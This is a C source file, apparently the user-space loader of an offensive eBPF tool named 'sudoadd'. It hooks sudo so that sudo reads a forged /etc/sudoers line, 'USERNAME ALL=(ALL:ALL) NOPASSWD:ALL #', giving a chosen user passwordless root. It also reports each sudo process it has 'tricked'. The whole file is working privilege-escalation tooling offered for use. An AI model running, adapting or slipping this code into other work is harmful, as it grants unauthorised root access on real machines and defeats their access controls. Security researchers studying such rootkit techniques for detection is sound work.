// SPDX-License-Identifier: BSD-3-Clause
#include <argp.h>
#include <unistd.h>
#include "sudoadd.skel.h"
#include "common_um.h"
#include "common.h"
#include <pwd.h>

#define INVALID_UID  -1
// https://stackoverflow.com/questions/3836365/how-can-i-get-the-user-id-associated-with-a-login-on-linux
uid_t lookup_user(const char *name)
{
    if(name) {
        struct passwd *pwd = getpwnam(name); /* don't free, see getpwnam() for details */
        if(pwd) return pwd->pw_uid;
    }
  return INVALID_UID;
}

// Setup Argument stuff
#define max_username_len 20
static struct env {
    char username[max_username_len];
    bool restrict_user;
    int target_ppid;
} env;

const char *argp_program_version = "sudoadd 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"SUDO Add\n"
"\n"
"Enable a user to elevate to root\n"
"by lying to 'sudo' about the contents of /etc/sudoers file\n"
"\n"
"USAGE: ./sudoadd -u username [-t 1111] [-r uid]\n";

static const struct argp_option opts[] = {
    { "username", 'u', "USERNAME", 0, "Username of user to " },
    { "restrict", 'r', NULL, 0, "Restict to only run when sudo is executed by the matching user" },
    { "target-ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children." },
    {},
};
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'u':
        if (strlen(arg) >= max_username_len) {
            fprintf(stderr, "Username must be less than %d characters\n", max_username_len);
            argp_usage(state);
        }
        strncpy(env.username, arg, sizeof(env.username));
        break;
    case 'r':
        env.restrict_user = true;
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case 'h':
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Tricked Sudo PID %d to allow user to become root\n", e->pid);
    else
        printf("Failed to trick Sudo PID %d to allow user to become root\n", e->pid);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct sudoadd_bpf *skel;
    int err;

    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) {
        return err;
    }
    if (env.username[0] == '\x00') {
        printf("Username Requried, see %s --help\n", argv[0]);
        exit(1);
    }

    // Do common setup
    if (!setup()) {
        exit(1);
    }

    // Open BPF application 
    skel = sudoadd_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Let bpf program know our pid so we don't get kiled by it
    skel->rodata->target_ppid = env.target_ppid;
    
    // Copy in username
    sprintf(skel->rodata->payload, "%s ALL=(ALL:ALL) NOPASSWD:ALL #", env.username);
    skel->rodata->payload_len = strlen(skel->rodata->payload);

    // If restricting by UID, look it up and set it
    // as this can't really be done by eBPF program
    if (env.restrict_user) {
        int uid = lookup_user(env.username);
        if (uid == INVALID_UID) {
            printf("Couldn't get UID for user %s\n", env.username);
            goto cleanup;
        }
        skel->rodata->uid = uid;
    }

    // Verify and load program
    err = sudoadd_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    // Attach tracepoint handler 
    err = sudoadd_bpf__attach( skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    printf("Successfully started!\n");
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    sudoadd_bpf__destroy( skel);
    return -err;
}
